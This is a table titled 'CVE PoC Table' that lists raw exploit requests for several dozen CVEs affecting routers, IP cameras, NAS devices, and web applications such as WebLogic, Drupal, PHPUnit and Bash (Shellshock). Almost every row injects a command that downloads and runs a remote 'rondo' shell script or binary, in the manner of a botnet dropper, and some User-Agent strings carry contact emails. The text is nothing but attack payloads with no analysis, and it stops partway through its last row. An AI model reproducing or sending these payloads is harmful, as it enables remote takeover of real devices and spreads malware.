# CVE PoC Table

<table>
<thead><tr><th>CVE</th><th>PoC</th></tr></thead>
<tbody>
<tr><td>ADB RCE</td><td><pre><code>CNXN\x00\x00\x00\x01\x00\x00\x04\x00\x1b\x00\x00\x00M\x0a\x00\x00\xfffd\xfffd\xfffd\xfffdhost::features=cmd,shell_v2</code></pre></td></tr>
<tr><td>CVE-2002-1951</td><td><pre><code>GET /x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/x/\xfffd\x1f^\xfffdv\x081\xfffd\xfffdF\x07\xfffdF\x0c\xfffd\x0b\xfffd\xfffdN\x08\xfffdV\x0c\x3401\x6c9\xfffd@\x340\xfffd\xfffd\xfffd\xfffd\xfffdwget -qO- http://&lt;REDACTED_IP&gt;/rondo.rwx.sh|sh; HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)

</code></pre></td></tr>
<tr><td>CVE-2009-5156</td><td><pre><code>GET /cgi-bin/script?system wget -qO- http://&lt;REDACTED_IP&gt;/rondo.epn.sh|sh; HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)

</code></pre></td></tr>
<tr><td>CVE-2010-1573</td><td><pre><code>POST /debug.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded
Authorization: Basic R2VtdGVrOmdlbXRla3N3ZA==

data1=wget -qO- http://&lt;REDACTED_IP&gt;/rondo.jbt.sh|sh&amp;command=ui_debug</code></pre></td></tr>
<tr><td>CVE-2010-2075</td><td><pre><code>AB; (wget -qO- http://&lt;REDACTED_IP&gt;/rondo.aqe.sh||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.aqe.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.aqe.sh)|sh \x0a</code></pre></td></tr>
<tr><td>CVE-2013-10069</td><td><pre><code>POST /command.php HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/x-www-form-urlencoded

cmd=wget -qO- http://&lt;REDACTED_IP&gt;/rondo.npe.sh|sh&amp;</code></pre></td></tr>
<tr><td>CVE-2013-1599</td><td><pre><code>GET /cgi-bin/rtpd.cgi?wget&amp;-qO-&amp;http://&lt;REDACTED_IP&gt;/rondo.abs.sh|sh;echo&amp; HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2013-7471</td><td><pre><code>POST /soap.cgi?service=WANIPConn1 HTTP/1.1
Host: &lt;REDACTED_IP&gt;:49152
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: text/xml

&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;m:AddPortMapping xmlns:m=&quot;urn:schemas-upnp-org:service:WANIPConnection:1&quot;&gt;&lt;NewPortMappingDescription&gt;&lt;NewPortMappingDescription&gt;&lt;NewLeaseDuration&gt;&lt;/NewLeaseDuration&gt;&lt;NewInternalClient&gt;\`wget -O- http://&lt;REDACTED_IP&gt;/rondo.dlinkupnp.sh|sh;\`&lt;/NewInternalClient&gt;&lt;NewEnabled&gt;1&lt;/NewEnabled&gt;&lt;NewExternalPort&gt;634&lt;/NewExternalPort&gt;&lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;&lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt;&lt;NewInternalPort&gt;45&lt;/NewInternalPort&gt;&lt;/m:AddPortMapping&gt;&lt;SOAPENV:Body&gt;&lt;SOAPENV:envelope&gt;</code></pre></td></tr>
<tr><td>CVE-2014-2321</td><td><pre><code>POST /web_shell_cmd.gch HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8081
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

IF_ACTION=apply&amp;IF_ERRORSTR=SUCC&amp;IF_ERRORPARAM=SUCC&amp;IF_ERRORTYPE=-1&amp;Cmd=wget -qO- http://&lt;REDACTED_IP&gt;/rondo.whm.sh|sh&amp;CmdAck=</code></pre></td></tr>
<tr><td>CVE-2014-3206</td><td><pre><code>GET /backupmgt/localJob.php?session=fail;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.tdj.sh|sh; HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2014-6271</td><td><pre><code>GET / HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: () { :; }; /bin/bash -c &quot;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.bash.sh|sh&amp;&quot;

</code></pre></td></tr>
<tr><td>CVE-2014-8361</td><td><pre><code>POST /wanipcn.xml HTTP/1.1
Host: &lt;REDACTED_IP&gt;:52869
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: text/xml

&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;s:Body&gt;&lt;u:AddPortMapping xmlns:u=&quot;urn:schemas-upnp-org:service:WANIPConnection:1&quot;&gt;&lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;&lt;NewExternalPort&gt;47451&lt;/NewExternalPort&gt;&lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt;&lt;NewInternalPort&gt;44382&lt;/NewInternalPort&gt;&lt;NewInternalClient&gt;\`busybox wget -O- http://&lt;REDACTED_IP&gt;/rondo.realtekupnp.sh|sh;\`&lt;/NewInternalClient&gt;&lt;NewEnabled&gt;1&lt;/NewEnabled&gt;&lt;NewPortMappingDescription&gt;syncthing&lt;/NewPortMappingDescription&gt;&lt;NewLeaseDuration&gt;0&lt;/NewLeaseDuration&gt;&lt;/u:AddPortMapping&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;</code></pre></td></tr>
<tr><td>CVE-2015-2280</td><td><pre><code>GET /maker/snwrite.cgi?mac=1234;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.eby.sh|sh HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)
Authorization: Basic cHJvZHVjdG1ha2VyOmZ0dnNiYW5uZWRjb2Rl

</code></pre></td></tr>
<tr><td>CVE-2016-11021</td><td><pre><code>POST /setSystemCommand HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YWRtaW46

ReplySuccessPage=docmd.htm&amp;ReplyErrorPage=docmd.htm&amp;SystemCommand=wget -qO- http://&lt;REDACTED_IP&gt;/rondo.jnw.sh|sh&amp;&amp;ConfigSystemCommand=Save</code></pre></td></tr>
<tr><td>CVE-2016-15057</td><td><pre><code>POST /continuum/saveInstallation.action HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

installation.name=aaaaaaaa&amp;installation.type=jdk&amp;installation.varValue=\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.mtg.sh|sh\`</code></pre></td></tr>
<tr><td>CVE-2016-1555</td><td><pre><code>POST /boardDataWW.php HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded
Referer: http://&lt;REDACTED_IP&gt;/boardDataWW.php

macAddress=112233445566;busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.tha.sh|sh #&amp;reginfo=0&amp;writeData=Submit</code></pre></td></tr>
<tr><td>CVE-2016-20017</td><td><pre><code>GET /login.cgi?multilingual show&#x27;;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.zta.sh|sh&#x27;$ HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2016-5674</td><td><pre><code>GET /__debugging_center_utils___.php?log=;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.whm.sh|sh HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Cookie: PHPSESSID=6hjpl1c6pvu8i0uln8cr6niv77

</code></pre></td></tr>
<tr><td>CVE-2016-6277</td><td><pre><code>GET /cgi-bin/;wget$IFS-O-$IFS&#x27;http://&lt;REDACTED_IP&gt;/rondo.netgear3.sh&#x27;|sh;echo$IFS HTTP/1.0
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2016-6563</td><td><pre><code>GET /HNAP1/ HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)

</code></pre></td></tr>
<tr><td>CVE-2017-10271</td><td><pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: text/xml

&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;\x0a &lt;soapenv:Header&gt;\x0a  &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;\x0a   &lt;java version=&quot;1.8&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;\x0a    &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;\x0a     &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;\x0a      &lt;void index=&quot;0&quot;&gt;\x0a       &lt;string&gt;/bin/sh&lt;/string&gt;\x0a      &lt;/void&gt;\x0a      &lt;void index=&quot;1&quot;&gt;\x0a       &lt;string&gt;-c&lt;/string&gt;\x0a      &lt;/void&gt;\x0a      &lt;void index=&quot;2&quot;&gt;\x0a       &lt;string&gt;(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.xcw.sh||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.xcw.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.xcw.sh)|sh&lt;/string&gt;\x0a      &lt;/void&gt;\x0a     &lt;/array&gt;\x0a     &lt;void method=&quot;start&quot;/&gt;\x0a    &lt;/void&gt;\x0a   &lt;/java&gt;\x0a  &lt;/work:WorkContext&gt;\x0a &lt;/soapenv:Header&gt;\x0a &lt;soapenv:Body/&gt;\x0a&lt;/soapenv:Envelope&gt;\x0a</code></pre></td></tr>
<tr><td>CVE-2017-11610</td><td><pre><code>POST /RPC2 HTTP/1.1
Host: &lt;REDACTED_IP&gt;:9001
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)
Content-Type: text/xml

&lt;?xml version=&quot;1.0&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;supervisor.supervisord.options.warnings.linecache.os.system&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;string&gt;(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.yfp.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.yfp.sh)|sh&lt;/string&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;</code></pre></td></tr>
<tr><td>CVE-2017-14135</td><td><pre><code>GET /webadmin/script?command=wget -qO- http://&lt;REDACTED_IP&gt;/rondo.rpu.sh|sh; HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8081
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2017-17105</td><td><pre><code>GET /cgi-bin/iptest.cgi?cmd=iptest.cgi&amp;-time=1504225666237&amp;-url=\`busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.eby.sh|sh\` HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)
Authorization: Basic cHJvZHVjdG1ha2VyOmZ0dnNiYW5uZWRjb2Rl

</code></pre></td></tr>
<tr><td>CVE-2017-17215</td><td><pre><code>POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
Host: &lt;REDACTED_IP&gt;:37215
User-Agent: Mozilla/5.0
Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;

&lt;?xml version=&quot;1.0&quot; ?&gt;\x0a    &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;\x0a    &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;\x0a    &lt;NewStatusURL&gt;$(cd /tmp;chmod -R 777 .;rm -rf rondo;busybox wget -g &lt;REDACTED_IP&gt; -l rondo -r /rondo.mips;busybox chmod 777 rondo;./rondo huawei.mips;echo )&lt;/NewStatusURL&gt;\x0a&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;\x0a&lt;/u:Upgrade&gt;\x0a    &lt;/s:Body&gt;\x0a    &lt;/s:Envelope&gt;</code></pre></td></tr>
<tr><td>CVE-2017-18368</td><td><pre><code>POST /cgi-bin/ViewLog.asp HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/x-www-formurlencoded

remote_submit_Flag=1&amp;remote_syslog_Flag=1&amp;RemoteSyslogSupported=1&amp;LogFlag=0&amp;remote_host=;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.umj.sh|sh&amp;echo &amp;remoteSubmit=Save</code></pre></td></tr>
<tr><td>CVE-2017-18369</td><td><pre><code>POST /cgi-bin/adv_remotelog.asp HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YWRtaW46cGFzc3dvcmQ=

RemotelogEnable=1&amp;syslogServerAddr=&lt;REDACTED_IP&gt;;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.gve.sh|sh;&amp;serverPort=514</code></pre></td></tr>
<tr><td>CVE-2017-6077</td><td><pre><code>GET /ping.cgi?pingIpAddress=google.fr;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.enk.sh|sh;&amp;sessionKey=1039230114 HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Referer: http://&lt;REDACTED_IP&gt;:8080/pingview.cmd
Authorization: Basic dXNlcjp1c2Vy

</code></pre></td></tr>
<tr><td>CVE-2017-6334</td><td><pre><code>POST /dnslookup.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YWRtaW46cGFzc3dvcmQ=

host_name=www.google.com;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.knt.sh|sh&amp;echo &amp;lookup=Lookup</code></pre></td></tr>
<tr><td>CVE-2017-9841</td><td><pre><code>POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: text/plain

&lt;?php system(&#x27;(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.dtm.sh||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.dtm.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.dtm.sh)|sh&#x27;); ?&gt;</code></pre></td></tr>
<tr><td>CVE-2018-10562</td><td><pre><code>POST /GponForm/diag_Form?images/ HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/x-www-form-urlencoded

XWebPageName=diag&amp;diag_action=ping&amp;wan_conlist=0&amp;dest_host=\`busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.zxb.sh|sh;\`&amp;ipv=0</code></pre></td></tr>
<tr><td>CVE-2018-14933</td><td><pre><code>GET /upgrade_handle.php?cmd=writeuploaddir&amp;uploaddir=&#x27;;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.jjw.sh|sh;&#x27; HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2018-17068</td><td><pre><code>POST /goform/Diagnosis HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

tokenid=xxxx&amp;sendNum=\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.npe.sh|sh\`</code></pre></td></tr>
<tr><td>CVE-2018-17173</td><td><pre><code>GET /qsr_server/device/getThumbnail?sourceUri=&#x27; -;curl -s http://&lt;REDACTED_IP&gt;/rondo.enk.sh|sh;&#x27;&amp;targetUri=/tmp/thumb/test.jpg&amp;mediaType=image&amp;targetWidth=400&amp;targetHeight=400&amp;scaleType=crop&amp;_=1537275717150 HTTP/1.1
Host: &lt;REDACTED_IP&gt;:9080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2018-17532</td><td><pre><code>POST /cgi-bin/hotspotlogin.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

send=1&amp;uamip=&quot;;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.eby.sh|sh #</code></pre></td></tr>
<tr><td>CVE-2018-25115</td><td><pre><code>POST /service.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded
Cookie: uid=abcdefghij

EVENT=CHECKFW&amp;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.zta.sh|sh&amp;</code></pre></td></tr>
<tr><td>CVE-2018-25118</td><td><pre><code>GET /PictureCatch.cgi?username=GEOVISION&amp;password=;busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.vgz.sh|sh;&amp;data_type=1&amp;attachment=1&amp;channel=1&amp;secret=1&amp;key=PWNED HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)

</code></pre></td></tr>
<tr><td>CVE-2018-25120</td><td><pre><code>POST /goform/Mail_Test HTTP/1.0
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded

C1=ON&amp;cmd=cgi_ntp_time&amp;f_ntp_server=\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.djc.sh|sh\`</code></pre></td></tr>
<tr><td>CVE-2018-25126</td><td><pre><code>POST /editBlackAndWhiteList HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: text/xml
Authorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;request version=&quot;1.0&quot; systemType=&quot;NVMS-9000&quot; clientType=&quot;WEB&quot;&gt;&lt;types&gt;&lt;filterTypeMode&gt;&lt;enum&gt;refuse&lt;/enum&gt;&lt;enum&gt;allow&lt;/enum&gt;&lt;/filterTypeMode&gt;&lt;addressType&gt;&lt;enum&gt;ip&lt;/enum&gt;&lt;enum&gt;iprange&lt;/enum&gt;&lt;enum&gt;mac&lt;/enum&gt;&lt;/addressType&gt;&lt;/types&gt;&lt;content&gt;&lt;switch&gt;true&lt;/switch&gt;&lt;filterType type=&quot;filterTypeMode&quot;&gt;refuse&lt;/filterType&gt;&lt;filterList type=&quot;list&quot;&gt;&lt;itemType&gt;&lt;addressType type=&quot;addressType&quot;/&gt;&lt;/itemType&gt;&lt;item&gt;&lt;switch&gt;true&lt;/switch&gt;&lt;addressType&gt;ip&lt;/addressType&gt;&lt;ip&gt;$(busybox${IFS}wget${IFS}-qO-${IFS}http://&lt;REDACTED_IP&gt;/rondo.zcb.sh|sh${IFS}&amp;)&lt;/ip&gt;&lt;/item&gt;&lt;/filterList&gt;&lt;/content&gt;&lt;/request&gt;</code></pre></td></tr>
<tr><td>CVE-2018-6000</td><td><pre><code>\x0c\x153\x00L\xfffd\xfffd\xfffd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/\x00wget -qO- http://&lt;REDACTED_IP&gt;/rondo.naz.sh|sh&amp;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code></pre></td></tr>
<tr><td>CVE-2018-7600</td><td><pre><code>POST /user/register?element_parents=account/mail/#value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.bxf.sh||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.bxf.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.bxf.sh)|sh</code></pre></td></tr>
<tr><td>CVE-2018-7841</td><td><pre><code>POST /smartdomuspad/modules/reporting/track_import_export.php HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=l337qjbsjk4js9ipm6mppa5qn4

op=export&amp;language=english&amp;interval=1&amp;object_id=\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.pms.sh|sh\`</code></pre></td></tr>
<tr><td>CVE-2019-10758</td><td><pre><code>POST /checkValid HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8081
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YWRtaW46cGFzcw==

document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.yfp.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.yfp.sh)|sh&quot;)</code></pre></td></tr>
<tr><td>CVE-2019-12725</td><td><pre><code>GET /cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;\x0awget -qO- http://&lt;REDACTED_IP&gt;/rondo.ame.sh|sh\x0a&#x27; HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2019-12780</td><td><pre><code>POST /upnp/control/basicevent1 HTTP/1.1
Host: &lt;REDACTED_IP&gt;:49152
User-Agent: UPnP/1.0 (bang2012@protonmail.com)
Content-Type: text/xml

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;s:Body&gt;&lt;u:SetSmartDevInfo xmlns:u=&quot;urn:Belkin:service:basicevent:1&quot;&gt;&lt;SmartDevURL&gt;\`busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.hsg.sh|sh\`&lt;/SmartDevURL&gt;&lt;/u:SetSmartDevInfo&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;</code></pre></td></tr>
<tr><td>CVE-2019-14931</td><td><pre><code>POST /action.php HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

host=;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.pms.sh|sh;&amp;PingCheck=Test</code></pre></td></tr>
<tr><td>CVE-2019-15107</td><td><pre><code>POST /password_change.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;:10000
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Referer: https://&lt;REDACTED_IP&gt;:10000/session_login.cgi

